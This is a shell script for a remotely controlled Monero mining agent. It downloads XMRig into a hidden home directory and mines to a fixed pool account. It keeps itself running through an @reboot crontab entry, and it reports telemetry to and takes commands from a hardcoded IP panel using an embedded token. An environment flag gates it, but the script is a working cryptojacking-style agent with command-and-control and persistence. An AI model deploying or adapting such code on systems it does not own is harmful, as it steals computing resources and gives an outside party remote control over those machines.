#!/bin/sh
set -u

#################################################
# MINING AGENT — FINAL / TELEMETRY CORRECT
# Works without systemd, non-root, container-safe
#################################################

# ===== SAFETY (явное разрешение) =====
[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

# ===== PANEL =====
PANEL="http://178.47.141.130:3333"
TOKEN="mamont22187"
INTERVAL=30
HOST="$(hostname)"

# ===== MINER =====
POOL="xmr.kryptex.network:7029"
USER="krxX3PVQVR.$HOST"

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/xmr" "$RUN" "$LOG" >/dev/null 2>&1

#################################################
# HELPERS
#################################################

json_escape() { echo "$1" | sed 's/"/\\"/g'; }

retry() {
  i=0
  while [ $i -lt 5 ]; do
    "$@" && return 0
    i=$((i+1))
    sleep $((i*2))
  done
  return 1
}

post() {
  retry curl -s "$1" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "$2" >/dev/null 2>&1
}

#################################################
# EVENTS
#################################################

send_event() {
  post "$PANEL/api/event" "{
    \"hostname\": \"$HOST\",
    \"level\": \"$1\",
    \"message\": \"$(json_escape "$2")\"
  }"
}

#################################################
# METRICS (FACTS ONLY)
#################################################

# hashrate from XMRig HTTP API
get_hashrate() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
    | grep -oE '"total":\[[^]]+' \
    | grep -oE '[0-9]+(\.[0-9]+)?' \
    | head -1 || echo 0
}

# cpu temp
get_cpu_temp() {
  sensors 2>/dev/null \
    | awk '/Package id 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' \
    | head -1
}

# gpu temp
get_gpu_temp() {
  nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1
}

# uptime
get_uptime() {
  uptime -p 2>/dev/null
}

# load
get_load() {
  uptime 2>/dev/null | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs
}

# gpu detected
gpu_detected() {
  lspci 2>/dev/null | grep -qiE "nvidia|amd" && echo true || echo false
}

#################################################
# XMRIG CONTROL
#################################################

start_xmrig() {
  stop_xmrig
  nohup "$BIN/xmr/xmrig" \
    -o "$POOL" -u "$USER" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/xmrig.log" 2>&1 &
  echo $! > "$RUN/xmrig.pid"
}

stop_xmrig() {
  [ -f "$RUN/xmrig.pid" ] && kill "$(cat "$RUN/xmrig.pid")" 2>/dev/null || true
  rm -f "$RUN/xmrig.pid"
}

#################################################
# INSTALL XMRIG
#################################################

install_xmrig() {
  [ -x "$BIN/xmr/xmrig" ] && return
  retry wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz || return
  tar -xzf /tmp/xmr.tgz -C "$BIN/xmr" --strip-components=1
  chmod +x "$BIN/xmr/xmrig"
}

#################################################
# AUTOSTART (REBOOT SAFE)
#################################################

ensure_autostart() {
  crontab -l 2>/dev/null | grep -q "ALLOW_MINING=1 $BASE/min.sh" && return
  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min.sh") | crontab -
}

#################################################
# CONTROL QUEUE
#################################################

check_control() {
  CMD=$(curl -s "$PANEL/api/control/pending?hostname=$HOST" -H "token: $TOKEN")
  echo "$CMD" | grep -q '"action"' || return

  ID=$(echo "$CMD" | grep -oE '"id":[0-9]+' | grep -oE '[0-9]+')
  ACT=$(echo "$CMD" | grep -oE '"action":"[^"]+' | cut -d'"' -f4)

  case "$ACT" in
    start_cpu) start_xmrig ;;
    stop_cpu) stop_xmrig ;;
    restart_all) stop_xmrig; start_xmrig ;;
    install_miner) install_xmrig; start_xmrig ;;
  esac

  post "$PANEL/api/control/ack" "{
    \"hostname\": \"$HOST\",
    \"command_id\": $ID,
    \"result\": \"success\",
    \"message\": \"$(json_escape "$ACT executed")\"
  }"

  send_event "INFO" "control: $ACT"
}

#################################################
# TELEMETRY (SOURCE OF TRUTH)
#################################################

send_telemetry() {
  HASHRATE="$(get_hashrate)"
  CPU_TEMP="$(get_cpu_temp)"
  GPU_TEMP="$(get_gpu_temp)"
  UPTIME="$(get_uptime)"
  LOAD="$(get_load)"

  post "$PANEL/api/telemetry" "{
    \"hostname\": \"$HOST\",
    \"cpu_mining\": \"$([ -f "$RUN/xmrig.pid" ] && echo running || echo stopped)\",
    \"gpu_mining\": \"stopped\",
    \"gpu_detected\": $(gpu_detected),
    \"hashrate\": $HASHRATE,
    \"cpu_temp\": ${CPU_TEMP:-null},
    \"gpu_temp\": ${GPU_TEMP:-null},
    \"uptime\": \"$(json_escape "$UPTIME")\",
    \"load\": ${LOAD:-null}
  }"
}

#################################################
# AGENT LOOP
#################################################

agent() {
  ensure_autostart
  install_xmrig
  start_xmrig
  send_event "INFO" "agent started"

  ZERO=0
  while true; do
    HR="$(get_hashrate)"

    if [ "$HR" = "0" ]; then
      ZERO=$((ZERO+1))
      [ "$ZERO" -ge 3 ] && {
        send_event "CRITICAL" "hashrate = 0"
        start_xmrig
        ZERO=0
      }
    else
      ZERO=0
    fi

    send_telemetry
    check_control
    sleep "$INTERVAL"
  done
}

#################################################
# MAIN
#################################################

agent
